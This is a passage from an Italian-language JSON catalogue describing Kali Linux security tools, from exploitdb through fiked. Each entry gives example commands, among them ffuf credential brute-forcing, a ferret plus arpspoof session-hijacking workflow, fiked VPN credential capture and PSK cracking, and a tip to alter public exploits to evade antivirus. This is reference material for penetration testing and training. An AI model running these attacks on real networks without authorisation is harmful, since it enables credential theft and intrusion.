comprendere realmente una vulnerabilità.</p><p><strong>Exploit Write-ups:</strong> Documentazione passo-passo di come un exploit è stato sviluppato: dall'analisi iniziale della vulnerabilità al PoC funzionante. Include spiegazioni delle tecniche di bypass (ASLR, DEP, stack canaries) e delle scelte implementative.</p><p><strong>Technique Documentation:</strong> Guide su tecniche offensive e difensive: pivoting, lateral movement, persistence, evasion, privilege escalation e post-exploitation. Utili come riferimento durante engagement reali.</p><p><strong>Offline Access:</strong> Tutta la documentazione è disponibile localmente, senza necessità di connessione internet. Fondamentale in reti air-gapped o durante operazioni dove l'accesso web potrebbe essere limitato o monitorato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I paper sono organizzati in sottodirectory e ricercabili tramite <code>searchsploit</code> o ricerca diretta nel filesystem.</p><pre><code># Elenco paper disponibili\nls /usr/share/exploitdb-papers/papers/\n\n# Cercare paper con searchsploit\nsearchsploit papers buffer overflow windows\n\n# Cercare paper per CVE\nsearchsploit papers CVE-2021-44228\n\n# Ricerca keyword in tutti i paper\ngrep -rl \"heap spray\" /usr/share/exploitdb-papers/\n\n# Cercare paper su una tecnologia specifica\nsearchsploit papers active directory kerberos\n\n# Aprire un paper trovato\nxdg-open /usr/share/exploitdb-papers/papers/12345.pdf\n\n# Contare paper disponibili per categoria\nfind /usr/share/exploitdb-papers/ -type f | wc -l</code></pre><p>I paper sono in vari formati: PDF, HTML, TXT e talvolta archivi con codice sorgente di accompagnamento.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Pre-Exploitation Research:</strong> Prima di tentare un exploit su un target, leggere il paper associato per comprendere prerequisiti, limitazioni e possibili effetti collaterali. Un exploit lanciato senza comprensione può causare crash o DoS involontari.</p><p><strong>Learning & Training:</strong> Risorsa didattica per studiare tecniche di exploitation, reverse engineering e vulnerability research. I write-up dettagliati permettono di replicare il processo di scoperta e sviluppo dell'exploit in ambiente lab.</p><p><strong>Engagement Preparation:</strong> Durante la preparazione di un penetration test, consultare paper su tecnologie specifiche del target per identificare vulnerabilità note e tecniche di exploitation applicabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorsa educativa:</strong> Questo pacchetto contiene solo documentazione, non codice eseguibile. Non genera traffico di rete e non interagisce con sistemi target. È una risorsa puramente informativa per la preparazione e la formazione.</p><p><strong>Aggiornamento:</strong> Aggiornare regolarmente con <code>apt update && apt install exploitdb-papers</code> per avere accesso alle ricerche più recenti. Nuovi paper vengono aggiunti costantemente al database Exploit-DB.</p><p><strong>Complementarità:</strong> Usare insieme ai pacchetti <code>exploitdb</code> (codice exploit) e <code>exploitdb-bin-sploits</code> (binari precompilati) per avere una vista completa: teoria (papers) + codice (exploitdb) + binari (bin-sploits).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "exploitdb",
    "name": "exploitdb",
    "version": "20250827",
    "icon": "../app/icons/exploitdb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb/",
    "desc": "Database locale di exploit pubblici con tool searchsploit per ricerca offline rapida.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ExploitDB</strong> è il database locale del famoso Exploit-DB, contenente migliaia di exploit pubblici, shellcode e proof-of-concept. Include searchsploit, un tool da riga di comando per cercare rapidamente exploit per software, versione o CVE. Database essenziale per ogni pentester.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Searchsploit:</strong> Ricerca rapida nel database locale.</p><p><strong>Offline Access:</strong> Funziona senza connessione internet.</p><p><strong>CVE Search:</strong> Cerca per numero CVE.</p><p><strong>Copy/Mirror:</strong> Copia exploit nella directory corrente.</p><p><strong>Regular Updates:</strong> Aggiornabile con searchsploit -u.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca per software con versione esatta\nsearchsploit apache 2.4.49 | grep -i \"remote\\|rce\\|exploit\"\n\n# Cerca CVE con output JSON per automazione\nsearchsploit CVE-2021-44228 --json | jq '.RESULTS_EXPLOIT[].Path'\n\n# Copia exploit in directory corrente\nsearchsploit -m 50383\n\n# Pipeline: nmap version scan -&gt; searchsploit\nnmap -sV target -oX scan.xml\nsearchsploit --nmap scan.xml\n\n# Escludi risultati DOS/denialofservice\nsearchsploit wordpress --exclude=\"dos|Denial\"\n\n# Cerca solo Metasploit modules\nsearchsploit apache -t --id | grep -i metasploit\n\n# Mirror exploit per analisi offline\nsearchsploit -m 50383 -o /tmp/exploits/\n\n# Cerca shellcode\nsearchsploit -s shellcode linux x86\n\n# Aggiorna e verifica ultimo update\nsearchsploit -u &amp;&amp; cat /usr/share/exploitdb/.searchsploit_rc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Assessment</strong>, cerca exploit per software trovato.</p><p>Nel <strong>Pentest</strong>, trova rapidamente PoC per CVE specifiche.</p><p><strong>Research</strong> per studiare vulnerabilità note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Exploits:</strong> Signature conosciute dagli AV. Modifica exploit prima dell'uso in engagement reali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "eyewitness",
    "name": "eyewitness",
    "version": "20230525.1",
    "icon": "../app/icons/eyewitness-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eyewitness/",
    "desc": "Cattura screenshot di siti web, RDP e VNC per visual recon rapida su larga scala.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EyeWitness</strong> cattura automaticamente screenshot di siti web, server RDP e VNC per permettere visual reconnaissance rapida su larga scala. Genera report HTML navigabile con tutti gli screenshot, identificando tecnologie, titoli e potenziali target interessanti. Essenziale per triage di grandi quantità di host.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Screenshots:</strong> Cattura pagine HTTP/HTTPS.</p><p><strong>RDP/VNC Support:</strong> Screenshot anche di servizi desktop remoto.</p><p><strong>HTML Reports:</strong> Report navigabile con filtri.</p><p><strong>Technology Detection:</strong> Identifica CMS, framework, server.</p><p><strong>Nmap Integration:</strong> Accetta output XML di Nmap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Web screenshot da Nmap con tutti i protocolli\neyewitness -x nmap.xml --web --all-protocols --no-prompt -d ./screenshots/\n\n# Bulk screenshot con threads e delay\neyewitness -f urls.txt --web -t 10 --timeout 30 --delay 2\n\n# RDP e VNC screenshot simultanei\neyewitness -f hosts.txt --rdp --vnc -d ./remote_desktop/\n\n# User-agent custom per evasione\neyewitness -f urls.txt --web --user-agent \"Mozilla/5.0 (Windows NT 10.0)\" \n\n# Con proxy e auth\neyewitness -f urls.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080\n\n# Pipeline completa: subfinder -&gt; httpx -&gt; eyewitness\nsubfinder -d target.com -silent | httpx -silent -o live.txt\neyewitness -f live.txt --web -d ./recon_$(date +%Y%m%d)/\n\n# Cicla su ogni screenshot per default creds check\neyewitness -f urls.txt --web --active-scan\n\n# Resume scan interrotto\neyewitness --resume ./ew_scan/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, visual triage di centinaia di web server.</p><p>Nel <strong>Bug Bounty</strong>, identifica rapidamente target interessanti.</p><p><strong>Red Team</strong> per mappare superficie d'attacco visivamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni attive a tutti i target. User-agent identificabile. Genera traffico significativo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "fatcat",
    "name": "fatcat",
    "version": "1.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fatcat/",
    "desc": "Tool forense per analizzare e manipolare filesystem FAT12/FAT16/FAT32 a basso livello.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FatCat</strong> è un tool forense specializzato per analisi a basso livello di filesystem FAT (FAT12, FAT16, FAT32). Permette di esplorare in dettaglio la struttura interna del filesystem, navigare le File Allocation Table, recuperare file cancellati analizzando directory entries orfane, manipolare cluster chain e accedere ai raw sector del disco. È particolarmente utile per digital forensics su supporti rimovibili come chiavette USB, schede SD, memorie di fotocamere e dispositivi embedded che utilizzano ancora filesystem FAT.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>FAT Structure Analysis:</strong> analizza in dettaglio la struttura della File Allocation Table, mostrando allocazione dei cluster, cluster chain, settori riservati e boot sector permettendo di comprendere l'organizzazione fisica dei dati sul supporto.</p><p><strong>Deleted File Recovery:</strong> recupera file cancellati identificando directory entries marcate come deleted (primo byte 0xE5) e ricostruendo i dati dai cluster ancora non sovrascritti, con possibilità di recupero anche di file frammentati.</p><p><strong>Cluster Chain Navigation:</strong> permette navigazione manuale attraverso la chain dei cluster per analizzare la frammentazione dei file, identificare cluster orfani e ricostruire file corrotti seguendo manualmente le allocazioni.</p><p><strong>Raw Sector Access:</strong> accesso diretto ai settori raw del disco per analisi esadecimale, permettendo di esaminare slack space, settori non allocati e dati nascosti non visibili a livello filesystem.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Visualizza info sul filesystem FAT\nfatcat disk.img -i\n\n# Lista contenuto directory root\nfatcat disk.img -l /\n\n# Lista ricorsiva di tutte le directory\nfatcat disk.img -l / -r\n\n# Mostra file cancellati recuperabili\nfatcat disk.img -d\n\n# Recupera file cancellato specifico\nfatcat disk.img -r deleted_file.txt -O recovered.txt\n\n# Estrai file esistente\nfatcat disk.img -x /path/to/file.doc -O extracted.doc\n\n# Analizza cluster chain di un file\nfatcat disk.img -c 1234\n\n# Dump settore raw in esadecimale\nfatcat disk.img -s 0 -n 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>USB/SD Card Forensics</strong>, analizzare supporti rimovibili formattati FAT per recuperare file cancellati, analizzare timeline di utilizzo e identificare dati nascosti in slack space.</p><p>Per <strong>Data Recovery</strong>, recuperare file eliminati accidentalmente o intenzionalmente da dispositivi FAT quando i cluster non sono ancora stati sovrascritti.</p><p>Per <strong>Malware Analysis</strong>, analizzare supporti FAT compromessi per identificare file malevoli, payload nascosti e artefatti lasciati da malware su dispositivi rimovibili.</p><p>Per <strong>Embedded Device Analysis</strong>, analizzare filesystem FAT di dispositivi IoT, fotocamere, dashcam e altri device che utilizzano FAT per storage.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only Operation:</strong> utilizzare sempre su immagini forensi (dd, dcfldd) e mai direttamente su device originali per preservare l'integrità delle prove. Il tool supporta esclusivamente filesystem FAT12/16/32 - per NTFS usare ntfsundelete, per ext usare extundelete. Documentare sempre la chain of custody per analisi forensi legali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "fern-wifi-cracker",
    "name": "fern-wifi-cracker",
    "version": "3.5",
    "icon": "../app/icons/fern-wifi-cracker-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fern-wifi-cracker/",
    "desc": "GUI per attacchi WiFi automatizzati: WEP/WPA cracking, WPS attack, session hijacking.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fern WiFi Cracker è un tool completo con interfaccia grafica per audit e attacchi su reti wireless. Automatizza l'intero processo di cracking WEP/WPA/WPA2, attacchi WPS (Pixie-Dust e brute force), attacchi MITM con ARP poisoning e session hijacking su reti aperte. Scritto in Python con framework Qt, offre un'interfaccia intuitiva che rende accessibili tecniche di wireless penetration testing anche a utenti meno esperti della command line, orchestrando in background tool come aircrack-ng, reaver e ettercap.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated WEP Cracking:</strong> esegue automaticamente l'intero processo di attacco WEP inclusi ARP replay, packet injection e statistical cracking con aircrack-ng, recuperando la chiave senza intervento manuale.</p><p><strong>WPA/WPA2 Dictionary Attack:</strong> cattura automaticamente il 4-way handshake tramite deauthentication dei client connessi, poi lancia dictionary attack con wordlist configurabili per tentare il recovery della passphrase.</p><p><strong>WPS PIN Attack:</strong> supporta attacchi WPS inclusi Pixie-Dust (offline, veloce su router vulnerabili) e brute force online del PIN, bypassando completamente la necessità di conoscere la password WPA.</p><p><strong>MITM &amp; Session Hijacking:</strong> integra funzionalità di ARP poisoning per posizionarsi man-in-the-middle e catturare cookie di sessione da traffico HTTP non cifrato per session hijacking su reti aperte o compromesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia interfaccia grafica (richiede root)\nsudo fern-wifi-cracker\n\n# Workflow tipico:\n# 1. Seleziona interfaccia wireless dal dropdown\n# 2. Clicca \"Scan for Access Points\" per discovery reti\n# 3. Attendi completamento scan (mostra WEP, WPA, WPS status)\n# 4. Seleziona target dalla lista\n# 5. Per WPA: carica wordlist e clicca \"WiFi Attack\"\n# 6. Per WPS: seleziona \"WPS Attack\" se il target ha WPS enabled\n# 7. Monitora progresso nella finestra principale\n\n# Requisiti:\n# - Scheda wireless con supporto monitor mode\n# - Driver compatibili (ath9k, rt2800usb, etc.)\n# - aircrack-ng suite installata\n# - reaver per attacchi WPS</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Security Auditing</strong>, condurre assessment automatizzato della sicurezza di reti wireless aziendali o domestiche verificando robustezza delle password e vulnerabilità WPS.</p><p>Per <strong>Learning &amp; Training</strong>, eccellente strumento didattico per imparare i concetti di wireless security e attacchi WiFi attraverso un'interfaccia visuale che mostra ogni fase del processo.</p><p>Per <strong>Quick Penetration Testing</strong>, ottenere risultati rapidi durante engagement quando non è necessario il controllo granulare offerto dai tool command-line.</p><p>Per <strong>Security Demonstrations</strong>, dimostrare visivamente a clienti o management i rischi di password WiFi deboli o WPS abilitato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tutte le attività wireless (deauth, packet injection, WPS brute force) sono facilmente rilevabili da WIDS enterprise e generano anomalie RF localizzabili. Richiede hardware con chipset compatibile monitor mode e packet injection (Atheros, Ralink consigliati). L'interfaccia GUI richiede display grafico. Usare solo su reti autorizzate con permesso esplicito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "feroxbuster",
    "name": "feroxbuster",
    "version": "2.11.0",
    "icon": "../app/icons/feroxbuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/feroxbuster/",
    "desc": "Content discovery tool velocissimo in Rust con ricorsione automatica e filtri avanzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Feroxbuster</strong> è un tool di content discovery scritto in Rust, ottimizzato per velocità e affidabilità. Supporta ricorsione automatica, filtri avanzati per status code/dimensioni/parole, backup file detection e resume di scan interrotti. Uno dei fuzzer web più veloci disponibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Speed:</strong> Scritto in Rust per performance massime.</p><p><strong>Auto-Recursion:</strong> Scansione ricorsiva automatica delle directory trovate.</p><p><strong>Smart Filtering:</strong> Filtra per status, size, words, lines, regex.</p><p><strong>Resume Support:</strong> Riprende scan interrotti da dove lasciato.</p><p><strong>Backup Detection:</strong> Cerca automaticamente file di backup.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo con auto-tune e resume\nferoxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,bak,old,html,txt,zip --auto-tune -o ferox_results.txt --resume-from ferox.state\n\n# Filtra per size e status, ignora errori\nferoxbuster -u https://target.com -C 404,403,500 -S 0 --filter-similar-to \"Page not found\"\n\n# Ricorsione limitata con depth\nferoxbuster -u https://target.com -d 3 --dont-scan /logout,/signout\n\n# Con headers e cookie autenticazione\nferoxbuster -u https://target.com -H \"Authorization: Bearer TOKEN\" \\\n  -H \"Cookie: session=abc123\" -b \"PHPSESSID=xyz789\"\n\n# Parallel scan di multipli URL\nferoxbuster --stdin &lt; urls.txt -w wordlist.txt --parallel 5\n\n# Backup file detection avanzato\nferoxbuster -u https://target.com --collect-backups --collect-extensions\n\n# JSON output per integrazione\nferoxbuster -u https://target.com --json -o results.json\n\n# Via proxy per Burp analysis\nferoxbuster -u https://target.com -p http://127.0.0.1:8080 -k</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trova file e directory nascosti velocemente.</p><p>Nel <strong>Bug Bounty</strong>, scansione rapida di grandi scope.</p><p><strong>Pentest</strong> per enumerazione web completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Genera molte request, facilmente loggabile. Rate limiting consigliato su target di produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "ferret-sidejack",
    "name": "ferret-sidejack",
    "version": "3.0.1",
    "icon": "../app/icons/ferret-sidejack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ferret-sidejack/",
    "desc": "Estrae cookie di sessione dal traffico di rete per session hijacking attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ferret è uno sniffer di rete specializzato nell'estrazione automatica di cookie di sessione dal traffico HTTP non cifrato. Parte del toolkit Sidejack originariamente sviluppato da Robert Graham, cattura passivamente cookie trasmessi in chiaro sulla rete per permettere attacchi di session hijacking (sidejacking). Utilizzato in combinazione con il proxy Hamster, permette di impersonare le sessioni web catturate senza conoscere le credenziali dell'utente. Sebbene l'adozione diffusa di HTTPS ne abbia ridotto l'efficacia, rimane uno strumento didattico importante per dimostrare i rischi delle connessioni non cifrate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Cookie Sniffing:</strong> cattura in modo completamente passivo i cookie trasmessi in header HTTP Set-Cookie e Cookie, senza generare traffico di rete che potrebbe essere rilevato, identificando automaticamente session token di siti popolari.</p><p><strong>Session Token Extraction:</strong> estrae e categorizza session ID, authentication token e altri cookie sensibili identificando il servizio di appartenenza (Gmail, Facebook, Yahoo, etc.) per facilitare il targeting dell'hijacking.</p><p><strong>PCAP Analysis Support:</strong> oltre alla cattura live, analizza file PCAP preesistenti permettendo estrazione offline di sessioni da catture effettuate con altri tool come tcpdump o Wireshark.</p><p><strong>Hamster Proxy Integration:</strong> output formattato per integrazione seamless con il proxy Hamster che permette di iniettare i cookie catturati nel browser dell'attaccante per impersonare le sessioni senza re-autenticazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura live su interfaccia di rete\nferret -i eth0\n\n# Analisi di file PCAP esistente\nferret -r captured_traffic.pcap\n\n# Output in formato Hamster\nferret -i eth0 -o cookies.txt\n\n# Workflow completo di session hijacking:\n# 1. Posizionati sulla rete (stesso segmento o MITM)\n# 2. Avvia cattura con Ferret\nferret -i eth0 -o cookies.txt\n\n# 3. In altra shell, avvia Hamster proxy\nhamster\n\n# 4. Configura browser per usare proxy localhost:1234\n# 5. Naviga a http://hamster per vedere sessioni catturate\n# 6. Clicca su sessione per impersonarla\n\n# Combinazione con ARP spoofing per MITM\narpspoof -i eth0 -t victim_ip gateway_ip &amp;\nferret -i eth0 -o cookies.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Session Hijacking Demonstration</strong>, dimostrare praticamente come un attaccante sulla stessa rete può impersonare sessioni utente quando il traffico non è cifrato con HTTPS.</p><p>Per <strong>Public WiFi Security Testing</strong>, verificare e dimostrare i rischi di utilizzo di reti WiFi pubbliche non protette dove il traffico può essere intercettato da qualsiasi utente connesso.</p><p>Per <strong>Security Awareness Training</strong>, strumento visuale ed efficace per training sulla sicurezza, mostrando concretamente perché HTTPS è essenziale e perché evitare reti pubbliche per attività sensibili.</p><p>Per <strong>Legacy Application Assessment</strong>, identificare applicazioni web aziendali che ancora non implementano HTTPS e trasmettono session cookie in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> completamente inefficace contro traffico HTTPS/TLS che rappresenta ormai la maggioranza del web. Richiede posizione sulla rete (stesso segmento broadcast) o setup MITM attivo (ARP spoofing). Tool datato ma ancora valido per dimostrazioni didattiche e testing di applicazioni legacy. I cookie con flag Secure non vengono trasmessi su HTTP plain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "ffuf",
    "name": "ffuf",
    "version": "2.1.0",
    "icon": "../app/icons/ffuf-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ffuf/",
    "desc": "Fuzzer web velocissimo in Go per directory, parametri, vhost e qualsiasi punto di injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FFUF</strong> (Fuzz Faster U Fool) è un web fuzzer estremamente veloce scritto in Go. Permette fuzzing di qualsiasi parte di una request HTTP: URL, parametri GET/POST, header, cookie, vhost. La keyword FUZZ indica dove inserire i payload dalla wordlist. Tool di riferimento per content discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Fuzzing:</strong> Fuzz qualsiasi parte della request.</p><p><strong>Filter/Match:</strong> Filtra risultati per status, size, words, lines, time, regex.</p><p><strong>Multiple Keywords:</strong> Usa FUZZ, FUZZ2, etc. per fuzzing multiplo.</p><p><strong>Recursion:</strong> Ricorsione automatica opzionale.</p><p><strong>Output Formats:</strong> JSON, CSV, HTML per integrazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory fuzzing con auto-calibration e estensioni\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -e .php,.html,.txt,.bak -ac -recursion -recursion-depth 2\n\n# VHost enumeration con filter dinamico\nffuf -u http://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs 0 -mc all\n\n# POST parameter fuzzing per SQLi\nffuf -u https://target.com/login -X POST -d \"user=admin&amp;pass=FUZZ\" \\\n  -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -fr \"error|syntax|mysql\"\n\n# Multi-keyword fuzzing (username:password)\nffuf -u https://target.com/login -X POST -d \"user=FUSER&amp;pass=FPASS\" \\\n  -w users.txt:FUSER -w passwords.txt:FPASS -fc 401 -mode clusterbomb\n\n# API endpoint discovery con autenticazione\nffuf -u https://api.target.com/v1/FUZZ -w api_endpoints.txt \\\n  -H \"Authorization: Bearer TOKEN\" -mc 200,201,401 -o api_results.json -of json\n\n# Rate limited scan via proxy\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5 \\\n  -x http://127.0.0.1:8080 -replay-proxy http://127.0.0.1:8080\n\n# Match response time per timing attacks\nffuf -u https://target.com/api?id=FUZZ -w nums.txt -ft \"&gt;500\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trova directory e file nascosti.</p><p>Nel <strong>Bug Bounty</strong>, enumera parametri e vhost.</p><p><strong>Pentest</strong> per fuzzing completo di applicazioni web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Molte request in poco tempo. Usa -rate per limitare velocità. User-agent modificabile.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "fierce",
    "name": "fierce",
    "version": "1.6.0",
    "icon": "../app/icons/fierce-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fierce/",
    "desc": "Scanner DNS per trovare target non contigui e spazio IP associato a un dominio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fierce</strong> è uno scanner DNS specializzato nella ricognizione che cerca di mappare lo spazio IP non contiguo associato a un dominio target. A differenza di scanner che si limitano a subdomain bruteforcing, Fierce combina multiple tecniche DNS per trovare server e host che potrebbero non essere ovvi, inclusi server ospitati in range IP completamente diversi dal blocco principale dell'organizzazione, cloud resources, CDN e infrastruttura distribuita geograficamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer Attempt:</strong> come primo step tenta sempre AXFR (DNS zone transfer) che, se misconfigured e permesso, rivela l'intero contenuto della zona DNS in un colpo solo - ancora sorprendentemente comune su DNS server mal configurati.</p><p><strong>Intelligent Subdomain Bruteforce:</strong> esegue brute force di subdomain usando wordlist ottimizzate, identificando host attivi e risolvendo i loro indirizzi IP per mappare l'infrastruttura esposta.</p><p><strong>Adjacent IP Discovery:</strong> quando trova un host, esegue reverse DNS lookup sugli IP adiacenti (es. se trova 10.0.0.5, testa 10.0.0.1-10.0.0.254) per scoprire altri server nello stesso range che potrebbero appartenere al target.</p><p><strong>Wildcard Detection:</strong> identifica e gestisce configurazioni DNS wildcard che risponderebbero positivamente a qualsiasi subdomain query, evitando falsi positivi massivi durante il bruteforce.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan standard di un dominio\nfierce --domain target.com\n\n# Con wordlist custom per subdomain\nfierce --domain target.com --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Range scan esteso (più IP adiacenti)\nfierce --domain target.com --wide\n\n# Salva output su file\nfierce --domain target.com --file output.txt\n\n# Con DNS server specifico\nfierce --domain target.com --dns-servers 8.8.8.8\n\n# Delay tra query (stealth)\nfierce --domain target.com --delay 0.5\n\n# Scan con traversal range più ampio\nfierce --domain target.com --traverse 50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial Reconnaissance</strong>, mappare rapidamente l'infrastruttura DNS di un target identificando host, subdomain e range IP associati come primo step di un penetration test.</p><p>Per <strong>Distributed Infrastructure Discovery</strong>, trovare server e risorse ospitati in range IP non contigui, cloud provider diversi o CDN che potrebbero sfuggire a scan IP-based tradizionali.</p><p>Per <strong>Attack Surface Mapping</strong>, identificare tutti i punti di ingresso potenziali di un'organizzazione esplorando sistematicamente il loro footprint DNS.</p><p>Per <strong>Zone Transfer Testing</strong>, verificare se i DNS server del target sono vulnerabili a zone transfer non autorizzati che esporrebbero l'intera configurazione DNS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> le query DNS sono facilmente loggabili dai DNS server e possono essere monitorate. Volume elevato di query per subdomain bruteforce è riconoscibile. Tool più moderni come Amass, Subfinder e DNSRecon offrono funzionalità più complete e tecniche passive. Fierce rimane utile per scan rapidi e come tool didattico per comprendere DNS reconnaissance.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "fiked",
    "name": "fiked",
    "version": "0.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fiked/",
    "desc": "Fake IKE daemon per intercettare credenziali VPN IPsec in attacchi MITM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fiked</strong> (Fake IKE Daemon) è uno strumento specializzato per attacchi man-in-the-middle contro VPN IPsec che utilizzano IKE (Internet Key Exchange) in modalità aggressiva. Emula un gateway VPN legittimo per ingannare i client e catturare le credenziali di autenticazione, inclusi Pre-Shared Keys (PSK) e credenziali XAUTH (username/password). È uno strumento fondamentale per dimostrare le debolezze delle configurazioni VPN legacy che ancora utilizzano IKEv1 Aggressive Mode.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IKE Gateway Emulation:</strong> Implementa un server IKE completo che risponde alle richieste dei client VPN. Supporta IKEv1 Phase 1 in Aggressive Mode, la configurazione vulnerabile che espone l'hash della PSK nella prima risposta.</p><p><strong>PSK Hash Capture:</strong> Intercetta e registra gli hash delle Pre-Shared Keys scambiati durante la negoziazione IKE. Questi hash possono essere successivamente crackati offline per recuperare la PSK in chiaro.</p><p><strong>XAUTH Credential Harvesting:</strong> Dopo la Phase 1, molte VPN utilizzano XAUTH per autenticazione utente aggiuntiva. Fiked cattura username e password trasmessi in questa fase, spesso in forma recuperabile.</p><p><strong>Transform Set Negotiation:</strong> Gestisce automaticamente la negoziazione dei parametri crittografici (encryption, hash, DH group) per accettare qualsiasi configurazione client, massimizzando la compatibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Fiked richiede una posizione MITM precedentemente stabilita (ARP spoofing, DNS poisoning, o compromissione del gateway).</p><pre><code># Avvia fake gateway con IP del gateway reale\nsudo fiked -g 192.168.1.1 -k\n\n# Con logging verboso per debug\nsudo fiked -g 192.168.1.1 -k -v\n\n# Specifica interfaccia di ascolto\nsudo fiked -g 192.168.1.1 -k -i eth0\n\n# Salva catture in file\nsudo fiked -g 192.168.1.1 -k -o captured_creds.txt\n\n# Dopo la cattura, crack della PSK con ike-scan\nike-scan --pskcrack=hash.txt -B wordlist.txt</code></pre><p>I client VPN si connetteranno al fake gateway credendo sia quello 